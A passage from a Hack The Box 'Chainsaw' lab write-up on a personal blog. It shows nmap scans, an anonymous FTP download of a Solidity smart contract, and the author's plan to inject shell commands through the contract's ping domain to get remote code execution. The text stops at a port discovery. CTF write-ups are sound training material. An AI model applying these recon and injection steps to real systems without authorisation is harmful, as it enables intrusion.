<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">

    
      <link rel="icon" href="/favicon.png" />
    

    <title>
        
          Hack The Box - Chainsaw - 0xRick
        
    </title>
    <style>
  #carbonads {
    border: 1px solid black;
    border-radius: 7px;
    border-spacing: 7px;
    display: block;
    overflow: hidden;
    padding: 1em;
    line-height: 1.5;
  }
  #carbonads span {
    position: relative;
    display: block;
    overflow: hidden;
  }
  .carbon-img {
    float: left;
    margin-right: 1em;
  }
  .carbon-img img {
    display: block;
  }
  .carbon-text {
    display: block;
    float: left;
    max-width: calc(100% - 130px - 1em);
    text-align: left;
  }
  .carbon-poweredby {
    position: absolute;
    left: 142px;
    bottom: 0;
    display: block;
    font-size: .8em;
    line-height: 1;
    letter-spacing: 1px;
    }
    </style>
    <!-- Spectre.css framework -->
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">

    <!-- theme css & js -->
    
<link rel="stylesheet" href="/css/book.css">

    
<script src="/js/book.js"></script>


    <!-- tocbot -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
    
    <!-- katex -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">

    
<!-- Google Analytics -->
<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-97164925-2', 'auto');
ga('send', 'pageview');
</script>
<!-- End Google Analytics -->

    
<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
<script>
document.addEventListener('DOMContentLoaded', function () {
    const zooming = new Zooming()
    zooming.listen('.book-content img')
})
</script>

    <style>
      #htbbadge{
        float: left;
      }
    </style>
<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/feed.xml" title="0xRick" type="application/rss+xml">
</head>

<body>

<div class="book-container">
  <div class="book-sidebar">
    <div class="book-brand">
  <a href="/">
    <img src="/favicon.png">
    <span>0XRICK</span>
  </a>
</div>
    <div class="book-menu">
  <ul>
<li><a href="/">Home</a></li>
</ul>
<h1 id="Categories"><a href="#Categories" class="headerlink" title="Categories"></a>Categories</h1><h2 id="Hack-The-Box-Write-ups"><a href="#Hack-The-Box-Write-ups" class="headerlink" title="Hack The Box Write-ups"></a>Hack The Box Write-ups</h2><ul>
<li><a href="/hack-the-box/ai/">Hack The Box - AI</a></li>
<li><a href="/hack-the-box/player/">Hack The Box - Player</a></li>
<li><a href="/hack-the-box/bitlab/">Hack The Box - Bitlab</a></li>
<li><a href="/hack-the-box/craft/">Hack The Box - Craft</a></li>
<li><a href="/hack-the-box/smasher2/">Hack The Box - Smasher2</a></li>
<li><a href="/hack-the-box/wall/">Hack The Box - Wall</a></li>
<li><a href="/hack-the-box/heist/">Hack The Box - Heist</a></li>
<li><a href="/hack-the-box/chainsaw/">Hack The Box - Chainsaw</a></li>
<li><a href="/hack-the-box/networked/">Hack The Box - Networked</a></li>
<li><a href="/hack-the-box/jarvis/">Hack The Box - Jarvis</a></li>
<li><a href="/hack-the-box/haystack/">Hack The Box - Haystack</a></li>
<li><a href="/hack-the-box/safe/">Hack The Box - Safe</a></li>
<li><a href="/hack-the-box/ellingson/">Hack The Box - Ellingson</a></li>
<li><a href="/hack-the-box/writeup/">Hack The Box - Writeup</a></li>
<li><a href="/hack-the-box/ghoul">Hack The Box - Ghoul</a></li>
<li><a href="/hack-the-box/swagshop/">Hack The Box - Swagshop</a></li>
<li><a href="/hack-the-box/kryptos/">Hack The Box - Kryptos</a></li>
<li><a href="/hack-the-box/luke/">Hack The Box - Luke</a></li>
<li><a href="/hack-the-box/bastion/">Hack The Box - Bastion</a></li>
<li><a href="/hack-the-box/bastion-2/">Hack The Box - Bastion (Commando)</a></li>
<li><a href="/hack-the-box/onetwoseven/">Hack The Box - OneTwoSeven</a></li>
<li><a href="/hack-the-box/unattended/">Hack The Box - Unattended</a></li>
<li><a href="/hack-the-box/helpline/">Hack The Box - Helpline</a></li>
<li><a href="/hack-the-box/arkham/">Hack The Box - Arkham</a></li>
<li><a href="/hack-the-box/fortune">Hack The Box - Fortune</a></li>
<li><a href="/hack-the-box/lacasadepapel/">Hack The Box - LaCasaDePapel</a></li>
<li><a href="/hack-the-box/ctf/">Hack The Box - CTF</a></li>
<li><a href="/c/categories/#Hack-The-Box"><strong>Older</strong></a></li>
</ul>
<h2 id="Wizard-Labs-Write-ups"><a href="#Wizard-Labs-Write-ups" class="headerlink" title="Wizard Labs Write-ups"></a>Wizard Labs Write-ups</h2><ul>
<li><a href="/wizard-labs/devlife/">Wizard Labs - Devlife</a></li>
<li><a href="/wizard-labs/dummy/">wizard Labs - Dummy</a></li>
</ul>
<h2 id="Basic-Binary-Exploitation"><a href="#Basic-Binary-Exploitation" class="headerlink" title="Basic Binary Exploitation"></a>Basic Binary Exploitation</h2><ul>
<li><a href="/binary-exploitation/bof6/">Bof: re2libc - protostar stack6</a></li>
<li><a href="/binary-exploitation/bof5/">Bof: ShellCode Injection - protostar stack5</a></li>
<li><a href="/binary-exploitation/bof4/">Bof: Taking control of the instruction pointer - protostar stack4</a></li>
<li><a href="/binary-exploitation/bof3/">Bof: Overwriting function pointers - protostar stack3</a></li>
<li><a href="/binary-exploitation/bof2/">Bof: Overwriting stack variables - protostar stack1,2</a></li>
<li><a href="/binary-exploitation/bof1/">Buffer Overflow Explained</a></li>
</ul>
<h2 id="Pwn-Challenges-Write-ups"><a href="#Pwn-Challenges-Write-ups" class="headerlink" title="Pwn Challenges Write-ups"></a>Pwn Challenges Write-ups</h2><ul>
<li><a href="/pwn/collision/">pwnable.kr - collision</a></li>
<li><a href="/pwn/bof/">pwnable.kr - bof</a></li>
<li><a href="/pwn/fd/">pwnable.kr - fd</a></li>
</ul>
<h2 id="Misc-CTF-Write-ups"><a href="#Misc-CTF-Write-ups" class="headerlink" title="Misc CTF Write-ups"></a>Misc CTF Write-ups</h2><ul>
<li><a href="/ctfs/egctf-qual/">EGCTF 2019 - Qualification Round</a></li>
</ul>
<h2 id="Lists"><a href="#Lists" class="headerlink" title="Lists"></a>Lists</h2><ul>
<li><a href="/lists/stego/">Steganography</a></li>
</ul>

</div>


<script src="/js/book-menu.js"></script>

  </div>

  <div class="off-canvas-content">
    <div class="columns">
      <div class="column col-10 col-lg-12">
        <div class="book-navbar">
          <!-- For Responsive Layout -->

<header class="navbar">
  <section class="navbar-section">
    <a onclick="open_sidebar()">
      <i class="icon icon-menu"></i>
    </a>
  </section>
</header>

        </div>
        <div class="book-content">
          <div class="book-post">
  <div> <script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script> </div> <br>
  <h1 id="Hack-The-Box-Chainsaw"><a href="#Hack-The-Box-Chainsaw" class="headerlink" title="Hack The Box - Chainsaw"></a>Hack The Box - Chainsaw</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>Hey guys, today Chainsaw retired and here’s my write-up about it. It was a great machine with vulnerable smart contracts and other fun stuff. I enjoyed it and I learned a lot while solving it. It’s a Linux box and its ip is <code>10.10.10.142</code>, I added it to <code>/etc/hosts</code> as <code>chainsaw.htb</code>. Let’s jump right in !</p>
<p><img src="/images/hackthebox/chainsaw/0.png" alt=""></p>
<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>As always we will start with <code>nmap</code> to scan for open ports and services:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;chainsaw# nmap -sV -sT -sC -o nmapinitial chainsaw.htb</span><br><span class="line">Starting Nmap 7.70 ( https:&#x2F;&#x2F;nmap.org ) at 2019-11-22 18:34 EET</span><br><span class="line">Nmap scan report for chainsaw.htb (10.10.10.142)</span><br><span class="line">Host is up (1.2s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21&#x2F;tcp open  ftp     vsftpd 3.0.3</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">| -rw-r--r--    1 1001     1001        23828 Dec 05  2018 WeaponizedPing.json</span><br><span class="line">| -rw-r--r--    1 1001     1001          243 Dec 12  2018 WeaponizedPing.sol</span><br><span class="line">|_-rw-r--r--    1 1001     1001           44 Nov 22 05:03 address.txt</span><br><span class="line">| ftp-syst:</span><br><span class="line">|   STAT:</span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:10.10.xx.xx</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 5</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.7p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 02:dd:8a:5d:3c:78:d4:41:ff:bb:27:39:c1:a2:4f:eb (RSA)</span><br><span class="line">|   256 3d:71:ff:d7:29:d5:d4:b2:a6:4f:9d:eb:91:1b:70:9f (ECDSA)</span><br><span class="line">|_  256 7e:02:da:db:29:f9:d2:04:63:df:fc:91:fd:a2:5a:f2 (ED25519)</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 394.56 seconds</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;chainsaw#</span><br></pre></td></tr></table></figure>
<p>We got <code>ssh</code> on port 22 and <code>ftp</code> on port 21.</p>
<h2 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h2><p>Anonymous authentication was allowed on the <code>ftp</code> server, so let’s check what’s in there:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;chainsaw# ftp chainsaw.htb </span><br><span class="line">Connected to chainsaw.htb.</span><br><span class="line">220 (vsFTPd 3.0.3)</span><br><span class="line">Name (chainsaw.htb:root): anonymous</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password:</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system type is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; ls</span><br><span class="line">200 PORT command successful. Consider using PASV.</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rw-r--r--    1 1001     1001        23828 Dec 05  2018 WeaponizedPing.json</span><br><span class="line">-rw-r--r--    1 1001     1001          243 Dec 12  2018 WeaponizedPing.sol</span><br><span class="line">-rw-r--r--    1 1001     1001           44 Nov 22 05:03 address.txt</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; mget *</span><br><span class="line">mget WeaponizedPing.json? y</span><br><span class="line">200 PORT command successful. Consider using PASV.</span><br><span class="line">150 Opening BINARY mode data connection for WeaponizedPing.json (23828 bytes).</span><br><span class="line">226 Transfer complete.</span><br><span class="line">23828 bytes received in 0.26 secs (88.2424 kB&#x2F;s)</span><br><span class="line">mget WeaponizedPing.sol? y</span><br><span class="line">200 PORT command successful. Consider using PASV.</span><br><span class="line">150 Opening BINARY mode data connection for WeaponizedPing.sol (243 bytes).</span><br><span class="line">226 Transfer complete.</span><br><span class="line">243 bytes received in 0.00 secs (2.3174 MB&#x2F;s)</span><br><span class="line">mget address.txt? y</span><br><span class="line">200 PORT command successful. Consider using PASV.</span><br><span class="line">150 Opening BINARY mode data connection for address.txt (44 bytes).</span><br><span class="line">226 Transfer complete.</span><br><span class="line">44 bytes received in 0.00 secs (421.2623 kB&#x2F;s)</span><br><span class="line">ftp&gt; exit</span><br><span class="line">221 Goodbye.</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;chainsaw#</span><br></pre></td></tr></table></figure>
<p><code>WeaponizedPing.sol</code>:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.24</span>;</span><br><span class="line"></span><br><span class="line">contract WeaponizedPing </span><br><span class="line">&#123;</span><br><span class="line">  string store = <span class="string">"google.com"</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">getDomain</span><span class="params">()</span> <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> <span class="params">(string)</span> </span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> store;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">setDomain</span><span class="params">(string _value)</span> <span class="title">public</span> </span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      store = _value;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>WeaponizedPing.json</code>:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"contractName"</span>: <span class="string">"WeaponizedPing"</span>,</span><br><span class="line">  <span class="attr">"abi"</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"constant"</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">"inputs"</span>: [],</span><br><span class="line">      <span class="attr">"name"</span>: <span class="string">"getDomain"</span>,</span><br><span class="line">      <span class="attr">"outputs"</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">"name"</span>: <span class="string">""</span>,</span><br><span class="line">          <span class="attr">"type"</span>: <span class="string">"string"</span></span><br><span class="line">        &#125;</span><br><span class="line">      ],</span><br><span class="line">      <span class="attr">"payable"</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">"stateMutability"</span>: <span class="string">"view"</span>,</span><br><span class="line">      <span class="attr">"type"</span>: <span class="string">"function"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"constant"</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">"inputs"</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">"name"</span>: <span class="string">"_value"</span>,</span><br><span class="line">          <span class="attr">"type"</span>: <span class="string">"string"</span></span><br><span class="line">        &#125;</span><br><span class="line">      ],</span><br><span class="line">      <span class="attr">"name"</span>: <span class="string">"setDomain"</span>,</span><br><span class="line">      <span class="attr">"outputs"</span>: [],</span><br><span class="line">      <span class="attr">"payable"</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">"stateMutability"</span>: <span class="string">"nonpayable"</span>,</span><br><span class="line">      <span class="attr">"type"</span>: <span class="string">"function"</span></span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">"bytecode"</span>: <span class="string">"0x60806040526040805190810160405280600a81526020017f676f6f676c652e636f6d000000000000000000000000000000000000000000008152506000908051906020019061004f929190610062565b5034801561005c57600080fd5b50610107565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f106100a357805160ff19168380011785556100d1565b828001600101855582156100d1579182015b828111156100d05782518255916020019190600101906100b5565b5b5090506100de91906100e2565b5090565b61010491905b808211156101005760008160009055506001016100e8565b5090565b90565b6102d7806101166000396000f30060806040526004361061004c576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063b68d180914610051578063e5eab096146100e1575b600080fd5b34801561005d57600080fd5b5061006661014a565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156100a657808201518184015260208101905061008b565b50505050905090810190601f1680156100d35780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b3480156100ed57600080fd5b50610148600480360381019080803590602001908201803590602001908080601f01602080910402602001604051908101604052809392919081815260200183838082843782019150505050505091929192905050506101ec565b005b606060008054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156101e25780601f106101b7576101008083540402835291602001916101e2565b820191906000526020600020905b8154815290600101906020018083116101c557829003601f168201915b5050505050905090565b8060009080519060200190610202929190610206565b5050565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f1061024757805160ff1916838001178555610275565b82800160010185558215610275579182015b82811115610274578251825591602001919060010190610259565b5b5090506102829190610286565b5090565b6102a891905b808211156102a457600081600090555060010161028c565b5090565b905600a165627a7a72305820d5d4d99bdb5542d8d65ef822d8a98c80911c2c3f15d609d10003ccf4227858660029"</span>,</span><br><span class="line">  <span class="attr">"deployedBytecode"</span>: <span class="string">"0x60806040526004361061004c576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063b68d180914610051578063e5eab096146100e1575b600080fd5b34801561005d57600080fd5b5061006661014a565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156100a657808201518184015260208101905061008b565b50505050905090810190601f1680156100d35780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b3480156100ed57600080fd5b50610148600480360381019080803590602001908201803590602001908080601f01602080910402602001604051908101604052809392919081815260200183838082843782019150505050505091929192905050506101ec565b005b606060008054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156101e25780601f106101b7576101008083540402835291602001916101e2565b820191906000526020600020905b8154815290600101906020018083116101c557829003601f168201915b5050505050905090565b8060009080519060200190610202929190610206565b5050565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f1061024757805160ff1916838001178555610275565b82800160010185558215610275579182015b82811115610274578251825591602001919060010190610259565b5b5090506102829190610286565b5090565b6102a891905b808211156102a457600081600090555060010161028c565b5090565b905600a165627a7a72305820d5d4d99bdb5542d8d65ef822d8a98c80911c2c3f15d609d10003ccf4227858660029"</span>,</span><br><span class="line">  <span class="attr">"sourceMap"</span>: <span class="string">"27:210:1:-;;;56:27;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;27:210;8:9:-1;5:2;;;30:1;27;20:12;5:2;27:210:1;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;;:::o;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;:::o;:::-;;;;;;;"</span>,</span><br><span class="line">  <span class="attr">"deployedSourceMap"</span>: <span class="string">"27:210:1:-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;88:75;;8:9:-1;5:2;;;30:1;27;20:12;5:2;88:75:1;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;23:1:-1;8:100;33:3;30:1;27:10;8:100;;;99:1;94:3;90:11;84:18;80:1;75:3;71:11;64:39;52:2;49:1;45:10;40:15;;8:100;;;12:14;88:75:1;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;166:68;;8:9:-1;5:2;;;30:1;27;20:12;5:2;166:68:1;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;88:75;130:6;153:5;146:12;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;88:75;:::o;166:68::-;223:6;215:5;:14;;;;;;;;;;;;:::i;:::-;;166:68;:::o;27:210::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;;:::o;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;:::o"</span>,</span><br><span class="line">  <span class="attr">"source"</span>: <span class="string">"pragma solidity ^0.4.24;\n\n\ncontract WeaponizedPing &#123;\n\n  string store = \"google.com\";\n\n  function getDomain() public view returns (string) &#123;\n      return store;\n  &#125;\n  function setDomain(string _value) public &#123;\n      store = _value;\n  &#125;\n\n&#125;\n\n"</span>,</span><br><span class="line">  <span class="attr">"sourcePath"</span>: <span class="string">"/opt/WeaponizedPing/WeaponizedPing.sol"</span>,</span><br><span class="line">  <span class="attr">"ast"</span>: &#123;</span><br><span class="line">    <span class="attr">"absolutePath"</span>: <span class="string">"/opt/WeaponizedPing/WeaponizedPing.sol"</span>,</span><br><span class="line">    <span class="attr">"exportedSymbols"</span>: &#123;</span><br><span class="line">      <span class="attr">"WeaponizedPing"</span>: [</span><br><span class="line">        <span class="number">80</span></span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">----------</span><br><span class="line"> Redacted</span><br><span class="line">----------</span><br><span class="line">  "networks": &#123;</span><br><span class="line">    "1543936419890": &#123;</span><br><span class="line">      "events": &#123;&#125;,</span><br><span class="line">      "links": &#123;&#125;,</span><br><span class="line">      "address": "0xaf6ce61d342b48cc992820a154fe0f533e5e487c",</span><br><span class="line">      "transactionHash": "0x5e94c662f1048fca58c07e16506f1636391f757b07c1b6bb6fbb4380769e99e1"</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  "schemaVersion": "2.0.1",</span><br><span class="line">  "updatedAt": "2018-12-04T15:24:57.205Z"</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>address.txt</code>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x479C21df57F2deaB052C466E4de7E82539F6A988</span><br></pre></td></tr></table></figure>

<h2 id="WeaponizedPing-Analysis"><a href="#WeaponizedPing-Analysis" class="headerlink" title="WeaponizedPing: Analysis"></a>WeaponizedPing: Analysis</h2><p><code>WeaponizedPing</code> is a <a href="https://blockgeeks.com/guides/smart-contracts/" target="_blank" rel="noopener">smart contract</a>. smart contracts are written in a language called <a href="https://solidity.readthedocs.io/en/v0.5.12/" target="_blank" rel="noopener">solidity</a>. </p>
<p>The contract has a variable called <code>store</code> which holds the value <code>google.com</code> by default:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string store = <span class="string">"google.com"</span>;</span><br></pre></td></tr></table></figure>
<p>There are two functions, <code>getDomain()</code> which returns the value of <code>store</code>:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getDomain</span><span class="params">()</span> <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> <span class="params">(string)</span> </span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="keyword">return</span> store;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>And <code>setDomain()</code> which takes a string and changes the value of <code>store</code> from whatever it was to that string:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setDomain</span><span class="params">(string _value)</span> <span class="title">public</span> </span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     store = _value;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>From the name of the contract (<code>WeaponizedPing</code>), I assumed that <code>ping</code> gets executed on <code>store</code>. We can control <code>store</code> by calling <code>setDomain()</code>, if the <code>ping</code> command doesn’t get filtered we’ll be able to inject commands and get <code>RCE</code>. However to do all of that we need to be able to interact with the contract in the first place.</p>
<h2 id="WeaponizedPing-Interaction"><a href="#WeaponizedPing-Interaction" class="headerlink" title="WeaponizedPing: Interaction"></a>WeaponizedPing: Interaction</h2><p>Assuming that the contract is deployed on a publicly exposed <code>ethereum</code> node, I ran a full <code>nmap</code> scan to find the port on which the server is running:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;chainsaw# nmap -p- -T5 chainsaw.htb --max-retries 1 -o nmapfull</span><br><span class="line">Starting Nmap 7.70 ( https:&#x2F;&#x2F;nmap.org ) at 2019-11-22 19:08 EET</span><br><span class="line">Nmap scan report for chainsaw.htb (10.10.10.142)</span><br><span class="line">Host is up (2.8s latency).</span><br><span class="line">Not shown: 37555 closed ports, 27977 filtered ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">21&#x2F;tcp   open  ftp</span><br><span class="line">22&#x2F;tcp   open  ssh</span><br><span class="line">9810&#x2F;tcp open  unknown</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 674.00 seconds</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;chainsaw#</span><br></pre></td></tr></table></figure>
<p>I found another open port (9810), I ran a service scan on that port:</p>
